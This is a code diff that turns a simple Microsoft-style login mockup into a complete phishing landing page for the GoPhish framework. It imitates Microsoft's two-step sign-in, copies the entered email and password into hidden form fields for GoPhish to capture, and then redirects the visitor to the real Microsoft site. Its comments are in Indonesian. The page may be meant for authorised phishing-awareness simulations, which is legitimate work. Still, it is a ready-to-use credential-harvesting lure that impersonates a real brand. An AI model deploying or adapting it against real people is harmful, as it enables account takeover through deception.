@@ -1,1 +1,106 @@
-<!DOCTYPE html> <html lang="id"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Masuk - Microsoft</title> <link rel="stylesheet" href="style.css"> </head> <body> <div class="container"> <div class="login-box"> <div class="logo"> <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" class="microsoft-logo"> <rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/> <rect x="10.5" y="0" width="9.5" height="9.5" fill="#7fba00"/> <rect x="0" y="10.5" width="9.5" height="9.5" fill="#00a4ef"/> <rect x="10.5" y="10.5" width="9.5" height="9.5" fill="#ffb900"/> </svg> <span>Microsoft</span> </div> <h1>Masuk</h1> <form id="loginForm"> <input type="text" id="username" placeholder="Alamat email, nomor telepon, atau Skype" required> <div class="links"> <a href="#">Belum punya akun? **Buat sekarang!**</a> <a href="#">Tidak dapat mengakses akun Anda?</a> </div> <div class="button-group"> <button type="button" class="btn-secondary" id="kembaliBtn">Kembali</button> <button type="submit" class="btn-primary" id="selanjutnyaBtn">Selanjutnya</button> </div> </form> </div> <div class="sign-in-options"> <p> <span class="icon-key">&#x1F511;</span> Opsi masuk </p> </div> </div> <footer> <a href="#">Ketentuan penggunaan</a> <a href="#">Privasi &amp; cookie</a> <span>...</span> </footer> <script src="login.js"></script> </body> </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Microsoft</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; margin: 0; padding: 0; }
+        .container { width: 350px; margin: 80px auto; padding: 30px; border: 1px solid #c8c8c8; }
+        .logo { margin-bottom: 20px; }
+        .title { font-size: 24px; font-weight: 600; color: #333333; margin-top: 20px; margin-bottom: 20px; }
+        .input-text { width: 100%; padding: 10px 0; margin-bottom: 10px; border: none; border-bottom: 1px solid #ccc; font-size: 16px; outline: none; transition: border-bottom-color 0.2s; }
+        .input-text:focus { border-bottom-color: #0078d4; }
+        .link { color: #0067b8; text-decoration: none; font-size: 14px; margin-top: 10px; display: block; }
+        .button-group { display: flex; justify-content: flex-end; margin-top: 40px; }
+        .button-back { background-color: #e6e6e6; color: #333333; border: none; padding: 10px 20px; cursor: pointer; margin-right: 10px; font-size: 16px; font-weight: 500; }
+        .button-next { background-color: #0078d4; color: #ffffff; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; font-weight: 500; }
+        .button-signin { background-color: #0078d4; color: #ffffff; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; font-weight: 500; float: right; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <form method="POST" id="gophish_form">
+        <input type="hidden" name="username" id="hidden_username">
+        <input type="hidden" name="password" id="hidden_password">
+        
+        <div class="logo">
+            <img src="https://logowik.com/content/uploads/images/microsoft-logo_2021.jpg" alt="Microsoft Logo" height="25">
+        </div>
+
+        <div id="step_username">
+            <div class="title">Sign in</div>
+            <input type="text" id="input_username" class="input-text" placeholder="Email, phone, or Skype" required>
+            
+            <a href="#" class="link">No account? Create one!</a>
+            <a href="#" class="link">Can't access your account?</a>
+            
+            <div class="button-group">
+                <button type="button" class="button-back">Back</button>
+                <button type="button" class="button-next" onclick="showPasswordStep()">Next</button>
+            </div>
+        </div>
+
+        <div id="step_password" style="display: none;">
+            <div class="title">Enter password</div>
+            <input type="password" id="input_password" class="input-text" placeholder="Password" required>
+            
+            <a href="#" class="link">Forgot my password</a>
+            
+            <div class="button-group">
+                <button type="button" class="button-back" onclick="showUsernameStep()">Back</button>
+                <button type="submit" class="button-signin">Sign in</button>
+            </div>
+        </div>
+
+    </form>
+</div>
+
+<script>
+    // URL Pengalihan (Redirect) setelah data ditangkap oleh GoPhish
+    // Ganti dengan URL Microsoft yang sebenarnya, misal: 'https://www.microsoft.com/id-id'
+    const REDIRECT_URL = "https://www.microsoft.com/id-id"; 
+
+    // Fungsi untuk menampilkan langkah password
+    function showPasswordStep() {
+        const username = document.getElementById('input_username').value;
+        if (username) {
+            // Simpan username ke hidden field GoPhish
+            document.getElementById('hidden_username').value = username;
+
+            // Tampilkan langkah password, sembunyikan langkah username
+            document.getElementById('step_username').style.display = 'none';
+            document.getElementById('step_password').style.display = 'block';
+            document.getElementById('input_password').focus();
+        } else {
+            alert("Please enter your email, phone, or Skype.");
+        }
+    }
+
+    // Fungsi untuk kembali ke langkah username
+    function showUsernameStep() {
+        document.getElementById('step_password').style.display = 'none';
+        document.getElementById('step_username').style.display = 'block';
+        document.getElementById('input_username').focus();
+    }
+
+    // Tangani pengiriman formulir GoPhish
+    document.getElementById('gophish_form').onsubmit = function() {
+        const password = document.getElementById('input_password').value;
+        
+        // Simpan password ke hidden field GoPhish
+        document.getElementById('hidden_password').value = password;
+        
+        // Data telah ditangkap GoPhish. Sekarang, alihkan pengguna.
+        setTimeout(function() {
+            window.location.href = REDIRECT_URL;
+        }, 100); // Penundaan singkat untuk memastikan pengiriman data ke GoPhish
+
+        // GoPhish menangani POST request, jadi tidak perlu preventDefault() di sini 
+        // selama form ACTION sudah disetel dengan benar oleh GoPhish.
+    };
+</script>
+
+</body>
+</html>
